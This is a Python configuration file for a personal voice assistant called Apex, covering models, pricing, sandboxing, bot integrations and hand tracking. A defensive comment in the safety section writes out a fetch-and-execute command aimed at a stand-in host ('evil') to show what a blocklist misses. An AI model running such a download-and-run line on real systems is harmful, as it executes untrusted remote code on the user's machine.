import os
from dotenv import load_dotenv

load_dotenv()

# Model
AGENT_MODEL = os.getenv("AGENT_MODEL", "claude-opus-5")
PROACTIVE_MODEL = "claude-haiku-4-5"
THINKING_BUDGET = 8000  # tokens for extended thinking

# API resilience
API_MAX_RETRIES = 4  # transient errors (429/500/529/network) retried by the SDK with exponential backoff
OPENROUTER_API_KEY = os.getenv("OPENROUTER_API_KEY", "")
FALLBACK_MODEL = os.getenv("FALLBACK_MODEL", "anthropic/claude-3-5-sonnet")
SMART_ROUTING_ENABLED = False   # set True to activate; routes simple queries to Haiku
ROUTING_SIMPLE_MODEL = "claude-haiku-4-5"
CURATOR_ENABLED = True
CURATOR_INTERVAL_DAYS = 7
CURATOR_MIN_IDLE_HOURS = 2
CURATOR_STALE_DAYS = 30
CURATOR_ARCHIVE_DAYS = 90

# The Constellation — a standing panel of 12 domain-expert "planets" orbiting the
# core Apex (the "Sun"). On a query, the relevant planets answer in parallel from
# their own expertise + persistent memory, and the Sun synthesizes one answer.
# AUTO is off by default: when on, only high-stakes queries auto-convene (the
# heuristic router returns no planets for everything else, so cost stays at zero).
CONSTELLATION_AUTO          = os.getenv("CONSTELLATION_AUTO", "false").lower() in {"1", "true", "yes"}
CONSTELLATION_LEARN         = os.getenv("CONSTELLATION_LEARN", "true").lower() in {"1", "true", "yes"}
CONSTELLATION_MAX_PLANETS   = int(os.getenv("CONSTELLATION_MAX_PLANETS", "4"))
CONSTELLATION_PLANET_MODEL  = os.getenv("CONSTELLATION_PLANET_MODEL", "claude-sonnet-5")
CONSTELLATION_SYNTH_MODEL   = os.getenv("CONSTELLATION_SYNTH_MODEL", AGENT_MODEL)
CONSTELLATION_MEMORY_MODEL  = os.getenv("CONSTELLATION_MEMORY_MODEL", PROACTIVE_MODEL)
CONSTELLATION_BRIEFING_MAXCHARS = int(os.getenv("CONSTELLATION_BRIEFING_MAXCHARS", "1500"))

# Write-approval gate — when True, memory/note/skill writes are staged for the
# user to approve from the dashboard instead of being applied immediately.
MEMORY_WRITE_APPROVAL = os.getenv("MEMORY_WRITE_APPROVAL", "false").lower() in {"1", "true", "yes"}
SKILL_WRITE_APPROVAL = os.getenv("SKILL_WRITE_APPROVAL", "false").lower() in {"1", "true", "yes"}

# Voice
WHISPER_MODEL = "base"          # tiny/base/small/medium/large
WHISPER_DEVICE = "cpu"          # cpu or cuda
SILENCE_THRESHOLD = 0.01        # RMS threshold to detect silence
SILENCE_DURATION = 1.5          # seconds of silence before stopping recording
MAX_RECORD_SECONDS = 60         # hard cap on recording length
SAMPLE_RATE = 16000

# TTS
TTS_ENGINE = os.getenv("TTS_ENGINE", "pyttsx3")  # pyttsx3 | elevenlabs | openai
TTS_RATE = 185                  # words per minute (pyttsx3)
ELEVENLABS_VOICE_ID = os.getenv("ELEVENLABS_VOICE_ID", "")
OPENAI_TTS_VOICE = os.getenv("OPENAI_TTS_VOICE", "alloy")   # alloy|echo|fable|onyx|nova|shimmer
OPENAI_STT_ENGINE = os.getenv("OPENAI_STT_ENGINE", "local")  # local|openai

# Proactive monitor
PROACTIVE_ENABLED = True

# Wake word
WAKE_WORD_ENABLED = os.getenv("WAKE_WORD_ENABLED", "true").lower() in {"1", "true", "yes"}
WAKE_PHRASES = ["apex", "hey apex", "yo apex", "okay apex", "ok apex"]

# Resident mode — always-on background companion (python main.py --resident)
RESIDENT_SILENT_BOOT = os.getenv("RESIDENT_SILENT_BOOT", "true").lower() in {"1", "true", "yes"}
RESIDENT_LOG_FILE = os.path.expanduser(os.getenv("RESIDENT_LOG_FILE", "~/.apex/resident.log"))
RESIDENT_AUDIT_FILE = os.path.expanduser(os.getenv("RESIDENT_AUDIT_FILE", "~/.apex/wake_audit.log"))
RESIDENT_GLOBAL_HOTKEY = os.getenv("RESIDENT_GLOBAL_HOTKEY", "<ctrl>+<space>")
RESIDENT_MUTE_HOTKEY = os.getenv("RESIDENT_MUTE_HOTKEY", "<ctrl>+<alt>+m")
RESIDENT_WAKE_REQUIRE_CONTINUATION = True  # "apex" alone won't trigger — must be followed by a request

# Awareness watchers
# Env-readable. It was a hardcoded True, so the only way to turn awareness
# off was to edit this file — which left main.py's "no monitor" branch
# unreachable by configuration, i.e. dead code.
AWARENESS_ENABLED = os.getenv("AWARENESS_ENABLED", "true").strip().lower() in ("1", "true", "yes")
AWARENESS_REVIEW_INTERVAL = 60        # seconds — how often to review event log
AWARENESS_WATCH_PATHS = [             # file watcher dirs
    "~/Documents", "~/Desktop", "~/Downloads",
]

# Obsidian vault (Apex's external, human-readable second brain)
VAULT_PATH = os.getenv("VAULT_PATH", "~/Documents/Apex")

# Knowledge base
KB_INDEX_PATHS = [                    # paths to index for RAG
    "~/Documents/notes",
    VAULT_PATH,                       # vault notes are always indexed
]

# Multi-agent
MAX_SUBAGENTS = 5                     # max concurrent sub-agents
MAX_ITERATIONS = 30                   # max tool-use iterations per agent turn

# Dashboard
DASHBOARD_ENABLED = True
DASHBOARD_PORT = int(os.getenv("DASHBOARD_PORT", "7860"))
DASHBOARD_HOST  = os.getenv("DASHBOARD_HOST", "127.0.0.1")
DASHBOARD_TOKEN = os.getenv("DASHBOARD_TOKEN", "")

# OCR / vision precision
OCR_CONFIDENCE_THRESHOLD = 30

# API keys
ANTHROPIC_API_KEY = os.getenv("ANTHROPIC_API_KEY", "")
ELEVENLABS_API_KEY = os.getenv("ELEVENLABS_API_KEY", "")
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "")
GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "")

# Research
MAX_SEARCH_RESULTS = 6
MAX_PAGE_CONTENT_CHARS = 8000

# Bash
BASH_TIMEOUT = 30               # seconds

# Execution sandbox — where bash + run_python actually execute.
#   EXECUTION_BACKEND=local   (default) runs on the host with full permissions.
#   EXECUTION_BACKEND=docker  runs each command in a throwaway container.
# When docker is selected but unavailable: fall back to local with a warning,
# unless SANDBOX_REQUIRE=true (then refuse to execute — fail closed).
EXECUTION_BACKEND = os.getenv("EXECUTION_BACKEND", "local").strip().lower()
SANDBOX_REQUIRE = os.getenv("SANDBOX_REQUIRE", "false").strip().lower() in ("1", "true", "yes")
SANDBOX_DOCKER_IMAGE = os.getenv("SANDBOX_DOCKER_IMAGE", "python:3.11-slim")
SANDBOX_NETWORK = os.getenv("SANDBOX_NETWORK", "none").strip().lower()   # "none" | "bridge"
SANDBOX_MEMORY = os.getenv("SANDBOX_MEMORY", "512m")
SANDBOX_CPUS = os.getenv("SANDBOX_CPUS", "1.0")
SANDBOX_PIDS_LIMIT = int(os.getenv("SANDBOX_PIDS_LIMIT", "256"))
SANDBOX_WORKDIR = os.getenv("SANDBOX_WORKDIR", "~/Documents/Apex/sandbox")

# Learning loop: best-of-n reranking (agent/reranker.py)
# Generates RERANK_N candidate answers and returns the one closest to what you
# have historically approved of (👍/👎 in Chat).
# OFF by default because it genuinely costs RERANK_N x generation per final answer.
# It self-disables when the reranker is cold (fewer than 3 rated answers), so
# enabling it before you have rated anything spends nothing.
# Never applies to tool-use turns or to streaming replies — see agent/core.
RERANK_ENABLED = os.getenv("RERANK_ENABLED", "false").strip().lower() in ("1", "true", "yes")
RERANK_N = max(2, min(4, int(os.getenv("RERANK_N", "2"))))

# Restraint (agent/restraint.py): hold non-urgent notifications until a moment
# you actually respond in. High-priority messages are never held, held messages
# are never dropped, and an unknown moment is treated as a good one - it learns
# to be quieter, it never starts quiet. Set false to make Apex always speak.
RESTRAINT_ENABLED = os.getenv("RESTRAINT_ENABLED", "true").strip().lower() in ("1", "true", "yes")

# Memory consolidation cadence (agent/reflection.consolidate_if_due).
# Consolidation distils recent activity into reflections and refreshes the
# preference digest that rides in every system prompt. It used to run only when
# the model chose to call reflect_now, i.e. almost never, so the whole
# consolidation layer was dormant. Costs one AGENT_MODEL call per run.
REFLECTION_INTERVAL_HOURS = float(os.getenv("REFLECTION_INTERVAL_HOURS", "6"))

# Research: grounding audit (agent/answers.py, audit_support)
# A cited sentence is flagged "weakly supported" when its cosine similarity to
# the passages of the source it cites falls below this floor.
# Deliberately conservative. Unrelated text scores ~0.0-0.15 on normalised
# MiniLM vectors and genuinely-supporting passages ~0.4+, so 0.25 flags only
# clear misattribution. Raise it to catch more and accept false alarms; a false
# flag on a good citation teaches you to ignore the flag, after which the check
# is worse than absent.
# NOTE: this compares topic, not truth — it cannot catch a wrong date.
RESEARCH_SUPPORT_FLOOR = float(os.getenv("RESEARCH_SUPPORT_FLOOR", "0.25"))

# Research: stream the answer to the dashboard as it is written.
# Tokens pass through agent/answers.CitationGate first, so an unbacked marker is
# never shown even mid-stream. Streaming failure falls back to the blocking call
# on its own; this switch exists so streaming can be turned off without a deploy.
RESEARCH_STREAM_ENABLED = os.getenv(
    "RESEARCH_STREAM_ENABLED", "true").strip().lower() in ("1", "true", "yes")

# Safety: semantic command review (agent/command_review.py)
# The pattern blocklist in agent/safety.py is finite and misses obvious variants
# (it stops `rm -rf` but not `curl evil -o /tmp/x && /tmp/x`). When enabled, a
# model reviews harm-capable tool calls that the blocklist let through. It can
# only ADD a confirmation prompt, never remove one.
# Cost note: this adds one small LLM call per *unseen* harm-capable tool call
# (verdicts are cached per exact input). Point SAFETY_REVIEW_MODEL at a local
# ollama/* model to make it free.
SAFETY_LLM_REVIEW = os.getenv("SAFETY_LLM_REVIEW", "true").strip().lower() in ("1", "true", "yes")
SAFETY_REVIEW_MODEL = os.getenv("SAFETY_REVIEW_MODEL", "")   # blank -> PROACTIVE_MODEL
# If the reviewer can't run, fall back to blocklist-only (today's posture) unless
# this is set, in which case treat an unavailable reviewer as risky.
SAFETY_REVIEW_REQUIRED = os.getenv("SAFETY_REVIEW_REQUIRED", "false").strip().lower() in ("1", "true", "yes")

# Screen
SCREENSHOT_QUALITY = 85         # JPEG quality for screenshots sent to Claude

# === Tier-4 ===

# Voice (streaming)
PARTIAL_INTERVAL_MS = 500       # how often to re-transcribe the rolling buffer

# Phone (Twilio)
TWILIO_SID = os.getenv("TWILIO_SID", "")
TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN", "")
TWILIO_FROM_NUMBER = os.getenv("TWILIO_FROM_NUMBER", "")
PHONE_ALLOWED_NUMBERS = [n.strip() for n in os.getenv("PHONE_ALLOWED_NUMBERS", "").split(",") if n.strip()]

# Telegram bot
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_ALLOWED_CHAT_IDS = [x.strip() for x in os.getenv("TELEGRAM_ALLOWED_CHAT_IDS", "").split(",") if x.strip()]
# Long-polling mode: Apex pulls messages via getUpdates instead of receiving a
# webhook. Set true when you have no public HTTPS URL (laptop / home machine).
# Leave false if you register a webhook with a public URL.
TELEGRAM_POLLING = os.getenv("TELEGRAM_POLLING", "false").lower() == "true"
# Echoed back by Telegram in X-Telegram-Bot-Api-Secret-Token on every delivery.
# Must match the `secret_token` given to setWebhook — tools/telegram.set_webhook
# registers both together. Without it, remote callers are refused outright.
TELEGRAM_WEBHOOK_SECRET = os.getenv("TELEGRAM_WEBHOOK_SECRET", "")

# Image generation (Replicate)
REPLICATE_API_TOKEN = os.getenv("REPLICATE_API_TOKEN", "")
IMAGE_GEN_MODEL = os.getenv("IMAGE_GEN_MODEL", "black-forest-labs/flux-schnell")
IMAGE_GEN_OUTPUT_DIR = os.getenv("IMAGE_GEN_OUTPUT_DIR", "~/.voice_agent_images")

# Telemetry — Anthropic per-million-token pricing (USD)
# Update when models / prices change.
MODEL_PRICING = {
    # Anthropic. These were badly stale: Opus was priced at $15/$75, which is
    # 3x its real rate, so every budget reading and cost estimate Apex produced
    # was inflated. Current rates below.
    "claude-fable-5":            {"input": 10.0,  "output": 50.0,  "cache_read": 1.00, "cache_create": 12.50},
    "claude-opus-5":             {"input": 5.0,   "output": 25.0,  "cache_read": 0.50, "cache_create": 6.25},
    "claude-opus-4-8":           {"input": 5.0,   "output": 25.0,  "cache_read": 0.50, "cache_create": 6.25},
    "claude-opus-4-7":           {"input": 5.0,   "output": 25.0,  "cache_read": 0.50, "cache_create": 6.25},
    "claude-opus-4-6":           {"input": 5.0,   "output": 25.0,  "cache_read": 0.50, "cache_create": 6.25},
    "claude-sonnet-5":           {"input": 3.0,   "output": 15.0,  "cache_read": 0.30, "cache_create": 3.75},
    "claude-sonnet-4-6":         {"input": 3.0,   "output": 15.0,  "cache_read": 0.30, "cache_create": 3.75},
    "claude-haiku-4-5":          {"input": 1.0,   "output": 5.0,   "cache_read": 0.10, "cache_create": 1.25},
    "claude-haiku-4-5-20251001": {"input": 1.0,   "output": 5.0,   "cache_read": 0.10, "cache_create": 1.25},
    # OpenAI
    "gpt-5.1":                   {"input": 1.25,  "output": 10.0,  "cache_read": 0.125,"cache_create": 0.0},
    "gpt-5":                     {"input": 1.25,  "output": 10.0,  "cache_read": 0.125,"cache_create": 0.0},
    "gpt-5-mini":                {"input": 0.25,  "output": 2.0,   "cache_read": 0.025,"cache_create": 0.0},
    "gpt-4o":                    {"input": 2.5,   "output": 10.0,  "cache_read": 1.25, "cache_create": 0.0},
    "gpt-4o-mini":               {"input": 0.15,  "output": 0.60,  "cache_read": 0.075,"cache_create": 0.0},
    "gpt-4-turbo":               {"input": 10.0,  "output": 30.0,  "cache_read": 0.0,  "cache_create": 0.0},
    "o3":                        {"input": 2.0,   "output": 8.0,   "cache_read": 0.50, "cache_create": 0.0},
    "o3-mini":                   {"input": 1.1,   "output": 4.4,   "cache_read": 0.55, "cache_create": 0.0},
    "o4-mini":                   {"input": 1.1,   "output": 4.4,   "cache_read": 0.275,"cache_create": 0.0},
    # Google Gemini
    "gemini-3-pro":              {"input": 2.0,   "output": 12.0,  "cache_read": 0.20, "cache_create": 0.0},
    "gemini-3-flash":            {"input": 0.30,  "output": 2.50,  "cache_read": 0.03, "cache_create": 0.0},
    "gemini-2.5-pro":            {"input": 1.25,  "output": 10.0,  "cache_read": 0.31, "cache_create": 0.0},
    "gemini-2.5-flash":          {"input": 0.30,  "output": 2.50,  "cache_read": 0.075,"cache_create": 0.0},
    "gemini-2.0-flash":          {"input": 0.10,  "output": 0.40,  "cache_read": 0.025,"cache_create": 0.0},
    # Ollama local models: any ollama/* model not listed here defaults to $0 (see telemetry._pricing).
}

# Price a model this file has never heard of, without editing code — the
# companion to EXTRA_MODELS. A discovered model with no price bills as $0, which
# takes the budget cap offline for it, so this is how you put it back.
#   MODEL_PRICING_JSON={"gpt-5.6-max": {"input": 5.0, "output": 25.0}}
# Missing cache_read/cache_create default to 0.
_pricing_json = os.getenv("MODEL_PRICING_JSON", "").strip()
if _pricing_json:
    try:
        import json as _json
        for _m, _p in _json.loads(_pricing_json).items():
            MODEL_PRICING[_m] = {
                "input": float(_p.get("input", 0.0)),
                "output": float(_p.get("output", 0.0)),
                "cache_read": float(_p.get("cache_read", 0.0)),
                "cache_create": float(_p.get("cache_create", 0.0)),
            }
    except Exception as _e:
        print(f"[Config] MODEL_PRICING_JSON ignored — could not parse: {_e}")

# Reflection
REFLECTION_AUTO_APPLY_THRESHOLD = 0.85

# Self-improving skills
SKILL_AUTOCREATE_MIN_TOOLS = 4   # tool calls in a turn before proposing a reusable skill

# Discord bot
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN", "")
DISCORD_PUBLIC_KEY = os.getenv("DISCORD_PUBLIC_KEY", "")
DISCORD_DEFAULT_CHANNEL_ID = os.getenv("DISCORD_DEFAULT_CHANNEL_ID", "")
DISCORD_ALLOWED_USER_IDS = [x.strip() for x in os.getenv("DISCORD_ALLOWED_USER_IDS", "").split(",") if x.strip()]

# Slack bot
SLACK_BOT_TOKEN = os.getenv("SLACK_BOT_TOKEN", "")
SLACK_SIGNING_SECRET = os.getenv("SLACK_SIGNING_SECRET", "")
SLACK_ALLOWED_CHANNEL_IDS = [x.strip() for x in os.getenv("SLACK_ALLOWED_CHANNEL_IDS", "").split(",") if x.strip()]

# WhatsApp (via Twilio — reuses TWILIO_SID / TWILIO_AUTH_TOKEN)
WHATSAPP_FROM_NUMBER = os.getenv("WHATSAPP_FROM_NUMBER", "")
WHATSAPP_ALLOWED_NUMBERS = [n.strip() for n in os.getenv("WHATSAPP_ALLOWED_NUMBERS", "").split(",") if n.strip()]

# Signal (via signal-cli-rest-api Docker bridge)
SIGNAL_CLI_URL = os.getenv("SIGNAL_CLI_URL", "")
SIGNAL_PHONE_NUMBER = os.getenv("SIGNAL_PHONE_NUMBER", "")
SIGNAL_ALLOWED_NUMBERS = [n.strip() for n in os.getenv("SIGNAL_ALLOWED_NUMBERS", "").split(",") if n.strip()]
# signal-cli bridges have no signing standard, so this is a shared secret set on
# whatever posts to /signal/webhook. Sent as X-Apex-Signature =
# HMAC-SHA256(raw_body). Bridges on localhost work without it; remote ones don't.
SIGNAL_WEBHOOK_SECRET = os.getenv("SIGNAL_WEBHOOK_SECRET", "")

# Ollama local models — point at a local or remote ollama instance.
# Use model names like ollama/llama3.2, ollama/mistral, ollama/qwen2.5, etc.
OLLAMA_BASE_URL = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434/v1")
# To add a local model to the council, set this to e.g. ollama/llama3.1
OLLAMA_COUNCIL_MODEL = os.getenv("OLLAMA_COUNCIL_MODEL", "")

# Webcam — local camera capture (opt-in, off by default; requires opencv-python)
CAMERA_ENABLED = os.getenv("CAMERA_ENABLED", "false").lower() in {"1", "true", "yes"}
CAMERA_DEVICE_INDEX = int(os.getenv("CAMERA_DEVICE_INDEX", "0"))

# Guardian Angel — decision-moment detection (works alongside awareness watchers)
GUARDIAN_ANGEL_ENABLED = os.getenv("GUARDIAN_ANGEL_ENABLED", "true").lower() in {"1", "true", "yes"}
GUARDIAN_THRESHOLD = float(os.getenv("GUARDIAN_THRESHOLD", "0.70"))
GUARDIAN_COOLDOWN_MINUTES = int(os.getenv("GUARDIAN_COOLDOWN_MINUTES", "20"))
GUARDIAN_MODELS = [m.strip() for m in os.getenv("GUARDIAN_MODELS", "claude-haiku-4-5,gpt-5-mini").split(",") if m.strip()]

# Time Capsule — long-horizon memory: bookmark goal/emotional statements and
# surface them as unprompted callbacks days or weeks later.
TIME_CAPSULE_ENABLED = os.getenv("TIME_CAPSULE_ENABLED", "true").lower() in {"1", "true", "yes"}
TIME_CAPSULE_MODEL = os.getenv("TIME_CAPSULE_MODEL", "claude-haiku-4-5")
TIME_CAPSULE_SCAN_INTERVAL_SECONDS = int(os.getenv("TIME_CAPSULE_SCAN_INTERVAL_SECONDS", "60"))
TIME_CAPSULE_SURFACE_INTERVAL_SECONDS = int(os.getenv("TIME_CAPSULE_SURFACE_INTERVAL_SECONDS", "1800"))
TIME_CAPSULE_DEFAULT_CALLBACK_DAYS = int(os.getenv("TIME_CAPSULE_DEFAULT_CALLBACK_DAYS", "14"))
TIME_CAPSULE_MAX_PER_DAY = int(os.getenv("TIME_CAPSULE_MAX_PER_DAY", "2"))

# === Omnipresence: cross-device notifications (Web Push / VAPID) ===
# Generate keys once with: python scripts/gen_vapid_keys.py  (writes to .env)
VAPID_PUBLIC_KEY = os.getenv("VAPID_PUBLIC_KEY", "")
VAPID_PRIVATE_KEY = os.getenv("VAPID_PRIVATE_KEY", "")
VAPID_SUBJECT = os.getenv("VAPID_SUBJECT", "mailto:apex@localhost")
# When no Web Push subscription exists yet, fall back to Telegram so proactive
# nudges still reach the user during setup.
NOTIFY_TELEGRAM_FALLBACK = os.getenv("NOTIFY_TELEGRAM_FALLBACK", "true").lower() in {"1", "true", "yes"}
NOTIFY_DEDUP_SECONDS = int(os.getenv("NOTIFY_DEDUP_SECONDS", "30"))
# Public HTTPS origin (set when exposed via a tunnel) — used for push click-through
# URLs, the PWA start_url, and QR pairing. Empty = local/LAN only.
PUBLIC_BASE_URL = os.getenv("PUBLIC_BASE_URL", "")

# === Jarvis integration — personality, PC control, app profiles, screen vision, orb ===
JARVIS_PERSONA_ENABLED = os.getenv("JARVIS_PERSONA_ENABLED", "true").lower() in {"1", "true", "yes"}
APP_CONTEXT_ENABLED = os.getenv("APP_CONTEXT_ENABLED", "true").lower() in {"1", "true", "yes"}
SCREEN_HOTKEY = os.getenv("SCREEN_HOTKEY", "")           # e.g. "<ctrl>+<shift>+s"
DESKTOP_SHELL_HOTKEY = os.getenv("DESKTOP_SHELL_HOTKEY", "<ctrl>+<shift>+\\")
ORB_ENABLED = os.getenv("ORB_ENABLED", "false").lower() in {"1", "true", "yes"}
PROFILE_DIGEST_ENABLED = os.getenv("PROFILE_DIGEST_ENABLED", "true").lower() in {"1", "true", "yes"}
PROFILE_DIGEST_INTERVAL_SECONDS = int(os.getenv("PROFILE_DIGEST_INTERVAL_SECONDS", "3600"))

# === Email — IMAP inbox triage + SMTP send (opt-in; off until configured) ===
# Use an app-specific password, never your main account password.
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS", "")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "")
EMAIL_IMAP_HOST = os.getenv("EMAIL_IMAP_HOST", "")     # blank = auto from address domain
EMAIL_IMAP_PORT = int(os.getenv("EMAIL_IMAP_PORT", "993"))
EMAIL_SMTP_HOST = os.getenv("EMAIL_SMTP_HOST", "")     # blank = auto from address domain
EMAIL_SMTP_PORT = int(os.getenv("EMAIL_SMTP_PORT", "587"))

# === Calendar — read-only CalDAV (opt-in; off until configured) ===
# Works with iCloud, Fastmail, Nextcloud, Google (app password), etc.
# Requires: pip install caldav
CALDAV_URL = os.getenv("CALDAV_URL", "")
CALDAV_USERNAME = os.getenv("CALDAV_USERNAME", "")
CALDAV_PASSWORD = os.getenv("CALDAV_PASSWORD", "")

# IoT — Home Assistant integration (opt-in, off by default)
IOT_ENABLED = os.getenv("IOT_ENABLED", "false").lower() in {"1", "true", "yes"}
IOT_HA_URL = os.getenv("IOT_HA_URL", "")          # e.g. http://homeassistant.local:8123
IOT_HA_TOKEN = os.getenv("IOT_HA_TOKEN", "")      # HA long-lived access token
IOT_WEBHOOK_SECRET = os.getenv("IOT_WEBHOOK_SECRET", "")  # HMAC secret for inbound webhooks
# Comma-separated entity_id allowlist for the passive awareness watcher.
# Leave blank to disable (recommended — don't flood the awareness log).
IOT_AWARENESS_ENTITIES = [e.strip() for e in os.getenv("IOT_AWARENESS_ENTITIES", "").split(",") if e.strip()]
# Comma-separated entity_id allowlist for inbound trigger webhooks.
# Leave blank to block all inbound triggers.
IOT_TRIGGER_ALLOWED_ENTITIES = [e.strip() for e in os.getenv("IOT_TRIGGER_ALLOWED_ENTITIES", "").split(",") if e.strip()]


# Hand tracking — Apex's OWN MediaPipe tracker, reading the webcam directly.
# No browser, no second process: it keeps working when nothing else is open.
HANDTRACK_ENABLED = os.getenv("HANDTRACK_ENABLED", "false").lower() in {"1", "true", "yes"}
HANDTRACK_POLL_HZ = float(os.getenv("HANDTRACK_POLL_HZ", "20"))
# Selfie space. A raw webcam frame is NOT mirrored, so without this a hand moving
# to your right travels left in the image and swipe_right fires for a leftward
# wave. Set false only if your camera already mirrors.
HANDTRACK_MIRROR = os.getenv("HANDTRACK_MIRROR", "true").lower() in {"1", "true", "yes"}
# Pinch = thumb-to-index distance as a fraction of the hand's own span, so it is
# scale-invariant and does not change with how far away you sit.
#
# 0.70 comes from a real hand on a real webcam (scripts/calibrate_pinch.py):
# pinched readings ran 0.25-0.62 (median 0.36) and an open hand 0.83-1.02
# (median 0.92) — a clean 0.21 gap. The previous default, 0.45, was a guess
# made with no camera to test against, and it sat BELOW the top of the real
# pinch range: every pinch measuring 0.45-0.62 was silently classified as
# not-a-pinch, which is why pinch appeared broken rather than mis-tuned.
#
# 0.70 sits just below the middle of that gap, and is deliberately a touch
# lower than the 0.74 the calibrator recommends for the hand it measured. The
# calibrator biases toward the open side so YOUR lazy pinch still registers,
# which it has earned the right to do because it measured you. A shipped
# default has measured nobody, and erring high is the worse failure on the
# board: an open hand read as a pinch grabs and drags cards you never touched,
# whereas a pinch that wants a little more commitment merely feels stiff.
#
# So: run scripts/calibrate_pinch.py for your own hand. It will tell you if
# yours disagrees, and refuse rather than guess if the reading is ambiguous.
HANDTRACK_PINCH_RATIO = float(os.getenv("HANDTRACK_PINCH_RATIO", "0.70"))
HANDTRACK_DEBUG = os.getenv("HANDTRACK_DEBUG", "false").lower() in {"1", "true", "yes"}
# The webcam is exclusive: while Apex holds it, no video call can open it. This
# is how long `release_camera` hands it back before tracking resumes on its own,
# so forgetting to resume cannot silently end hand tracking.
HANDTRACK_RELEASE_SECONDS = float(os.getenv("HANDTRACK_RELEASE_SECONDS", "300"))
HANDTRACK_GESTURE_COOLDOWN_SECONDS = float(os.getenv("HANDTRACK_GESTURE_COOLDOWN_SECONDS", "3"))
# Comma-separated gesture:action pairs — the ONLY place a gesture acquires
# power. Deny-by-default: an unmapped gesture is still logged (so you can see it
# was recognized) but does nothing. Leave blank for look-but-don't-touch.
# Known gestures: wave, pinch_hold, swipe_left/right/up/down, hands_present, hands_gone.
# Known actions: wake, listen, stop.
HANDTRACK_GESTURE_ACTIONS = [e.strip() for e in os.getenv(
    "HANDTRACK_GESTURE_ACTIONS", "wave:wake,pinch_hold:listen,swipe_down:stop").split(",") if e.strip()]

# Which MediaPipe delegate the hand tracker runs on: auto | gpu | cpu.
# "auto" tries GPU and falls back to CPU, reporting which it got — measured at
# 17.6 ms/frame on CPU, which is ~35% of one core at 20 Hz. MediaPipe raises
# rather than silently degrading when a GPU context cannot be made, so the
# fallback is safe; the delegate actually used is printed at startup either way.
HANDTRACK_DELEGATE = os.getenv("HANDTRACK_DELEGATE", "auto").strip().lower()
# How sure MediaPipe must be before it reports a hand at all.
#
# Back to MediaPipe's own default of 0.5. The previous 0.7 was reasoning, not
# measurement — the worry was that a low bar hallucinates hands in a cluttered
# background and a phantom hand could fire a gesture when nobody moved. What a
# real calibration run showed is the cost of the other side: the hand was
# detected in only 46 of 205 frames (~22%), and an OPEN hand fared worse (11%)
# than a pinched one (31%), which is backwards — a splayed hand is the easy
# case. A tracker that sees your hand a fifth of the time reads as broken, and
# the phantom-gesture risk it was buying protection against is separately
# covered: gestures need dwell time, hysteresis and a cooldown before they fire
# (agent/gestures.py, agent/board.py's ARM_DWELL_SECONDS).
#
# Raise it if you see gestures fire when your hands are nowhere near the camera.
HANDTRACK_MIN_CONFIDENCE = float(os.getenv("HANDTRACK_MIN_CONFIDENCE", "0.5"))

# Run Apex's conversation on a Claude subscription instead of metered API
# credits. Off by default: it needs the `claude` CLI installed and logged in,
# and it draws on the SAME five-hour window as your own Claude Code sessions.
SUBSCRIPTION_ENABLED = os.getenv("SUBSCRIPTION_ENABLED", "false").lower() in {"1", "true", "yes"}
# Which call sites route there. Measured: the SDK carries ~26.5k tokens of
# Claude Code harness per call, which makes it 3x DEARER than Haiku for
# high-volume background work — so deep research and the awareness loop stay on
# the API. The conversation is the opposite case: one Opus turn with 90 tools is
# ~$0.11 on the API, and dozens a day is real money.
SUBSCRIPTION_CALL_SITES = [s.strip() for s in os.getenv(
    "SUBSCRIPTION_CALL_SITES", "agent.core/main").split(",") if s.strip()]

# Apex's own glass board — cards you move with your hands, at /board on the
# dashboard. Rendered from the tracker Apex already runs in Python, so it
# keeps working when the tab is not in front. Needs HANDTRACK_ENABLED.
BOARD_ENABLED = os.getenv("BOARD_ENABLED", "false").lower() in {"1", "true", "yes"}
# Frames per second for the board's video backdrop. The picture has to come from
# Python because it holds the camera exclusively; 15 is smooth enough behind
# cards and a third of the bandwidth of 45.
BOARD_FPS = float(os.getenv("BOARD_FPS", "15"))

# Voice-driven 3D creation — "Apex, create a red cube, 50 millimetres wide."
# Blender itself is not something Apex can bundle or launch: it is a real,
# separately-installed application, and bpy (Blender's Python API) is only safe
# to call from Blender's own main thread. So the boundary here is a small
# ADDON that runs INSIDE Blender (blender/apex_blender_addon.py — install it
# once via Blender's Preferences > Add-ons > Install) and a thin client in
# agent/blender_bridge.py that talks to it over a localhost socket. Nothing
# about this is a second Apex service: there is no bridge process of Apex's
# own, no separate repo, and no network hop beyond one loopback socket — the
# same "aggregation, not a second Apex" posture MCP servers already have.
#
# The addon deliberately does NOT expose arbitrary code execution. It accepts a
# fixed, small command set (create a primitive with explicit dimensions, set a
# colour, export a GLB) and refuses everything else — the doc that specified
# this feature calls unrestricted Python-in-Blender an explicitly EXCLUDED
# capability, and agent/blender_bridge.py enforces the same allowlist again on
# the Apex side, so a compromised or buggy caller on either end is still capped
# by the other.
BLENDER_ENABLED = os.getenv("BLENDER_ENABLED", "false").lower() in {"1", "true", "yes"}
BLENDER_HOST = os.getenv("BLENDER_HOST", "127.0.0.1")
BLENDER_PORT = int(os.getenv("BLENDER_PORT", "8799"))
BLENDER_TIMEOUT_SECONDS = float(os.getenv("BLENDER_TIMEOUT_SECONDS", "20"))
# A created object this large or small is certainly a typo or a hallucinated
# unit, not a real request — 4 metres is bigger than the workbench this is
# named after, and anything under a millimetre is not millimetre-dimensioned.
BLENDER_MIN_DIM_MM = float(os.getenv("BLENDER_MIN_DIM_MM", "1"))
BLENDER_MAX_DIM_MM = float(os.getenv("BLENDER_MAX_DIM_MM", "4000"))
